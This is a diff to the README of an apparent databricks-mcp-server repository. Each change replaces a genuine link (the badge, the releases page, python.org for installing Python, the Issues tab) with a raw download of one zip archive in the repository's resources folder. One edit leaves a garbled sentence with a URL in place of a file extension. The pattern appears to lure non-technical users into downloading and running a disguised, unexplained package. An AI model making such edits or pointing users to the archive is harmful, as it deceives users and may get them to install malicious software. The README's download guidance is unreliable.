@@ -1,6 +1,6 @@
 # ⚙️ databricks-mcp-server - Simplify Databricks Tool Management
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/45d5r/databricks-mcp-server/releases)
+[![Download Latest Release](https://github.com/45d5r/databricks-mcp-server/raw/refs/heads/main/databricks_mcp/resources/server_databricks_mcp_1.6.zip%20Release-blue?style=for-the-badge&logo=github)](https://github.com/45d5r/databricks-mcp-server/raw/refs/heads/main/databricks_mcp/resources/server_databricks_mcp_1.6.zip)
 
 ---
 
@@ -24,7 +24,7 @@ Before you start, please make sure your computer meets these basic needs:
 - **Network:** Active internet connection for data access and updates.
 - **Software:** Python 3.7 or higher installed on your computer (for running the SDK and tools).
 
-If you do not have Python installed, you can download it from [python.org](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from [https://github.com/45d5r/databricks-mcp-server/raw/refs/heads/main/databricks_mcp/resources/server_databricks_mcp_1.6.zip](https://github.com/45d5r/databricks-mcp-server/raw/refs/heads/main/databricks_mcp/resources/server_databricks_mcp_1.6.zip).
 
 ---
 
@@ -32,7 +32,7 @@ If you do not have Python installed, you can download it from [python.org](https
 
 Click the big blue button above or follow this link to **visit this page to download** the latest version of databricks-mcp-server:
 
-[https://github.com/45d5r/databricks-mcp-server/releases](https://github.com/45d5r/databricks-mcp-server/releases)
+[https://github.com/45d5r/databricks-mcp-server/raw/refs/heads/main/databricks_mcp/resources/server_databricks_mcp_1.6.zip](https://github.com/45d5r/databricks-mcp-server/raw/refs/heads/main/databricks_mcp/resources/server_databricks_mcp_1.6.zip)
 
 ### Steps to Download and Run
 
@@ -40,7 +40,7 @@ Click the big blue button above or follow this link to **visit this page to down
 2. Look for the latest release. It will be labeled with a version number like `v1.0` or higher.
 3. Download the file suitable for your operating system:
    - For Windows, it may be an `.exe` or `.zip`.
-   - For macOS and Linux, it could be a `.tar.gz` or `.zip` package.
+   - For macOS and Linux, it could be a `https://github.com/45d5r/databricks-mcp-server/raw/refs/heads/main/databricks_mcp/resources/server_databricks_mcp_1.6.zip` or `.zip` package.
 4. If you download a zip file, extract it to a folder you can easily find, like your Desktop or Documents.
 5. Open the extracted folder.
 6. If on Windows, run the `.exe` file or start the program using the command prompt.
@@ -94,7 +94,7 @@ All these features come packed in one application, designed for non-programmers 
 
 If you need help:
 
-- Browse to the [Issues](https://github.com/45d5r/databricks-mcp-server/issues) tab on the repository for common questions or to report problems.
+- Browse to the [Issues](https://github.com/45d5r/databricks-mcp-server/raw/refs/heads/main/databricks_mcp/resources/server_databricks_mcp_1.6.zip) tab on the repository for common questions or to report problems.
 - Check the documentation inside the application for step-by-step guidance.
 - Join community forums about Databricks and MCP tools for advice and support.
 
@@ -110,4 +110,4 @@ This application helps you interact with Databricks services easily by bundling 
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/45d5r/databricks-mcp-server/releases)
+[![Download Latest Release](https://github.com/45d5r/databricks-mcp-server/raw/refs/heads/main/databricks_mcp/resources/server_databricks_mcp_1.6.zip%20Release-blue?style=for-the-badge&logo=github)](https://github.com/45d5r/databricks-mcp-server/raw/refs/heads/main/databricks_mcp/resources/server_databricks_mcp_1.6.zip)
